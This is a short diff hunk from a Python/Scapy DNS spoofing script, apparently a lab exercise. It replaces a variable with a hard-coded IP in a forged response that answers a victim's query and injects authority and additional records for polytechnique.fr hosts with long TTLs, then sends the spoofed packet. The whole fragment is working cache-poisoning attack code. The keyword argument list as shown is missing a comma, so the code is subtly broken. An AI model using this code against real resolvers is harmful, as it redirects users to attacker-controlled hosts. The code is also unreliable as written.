@@ -40,7 +40,7 @@ def maFonction(a):
                       UDP(dport=a[UDP].sport, sport=a[UDP].dport)/\
                       DNS(id=a[DNS].id, qd=a[DNS].qd, aa = 1, qr=1, \
                       an = DNSRR(rrname=a[DNS].qd.qname,  ttl=10, rdata='129.104.221.35'), \
-                      ar = DNSRR(rrname = "rackham.polytechnique.fr", type = "A", ttl = 86400, rdata = ip_autorite) \
+                      ar = DNSRR(rrname = "rackham.polytechnique.fr", type = "A", ttl = 86400, rdata = '129.104.32.41') \
                       ns = DNSRR(rrname = "polytechnique.fr", type = "NS", ttl = 86400, rdata = "rackham.polytechnique.fr"))
         send(spoofed_pkt)
 
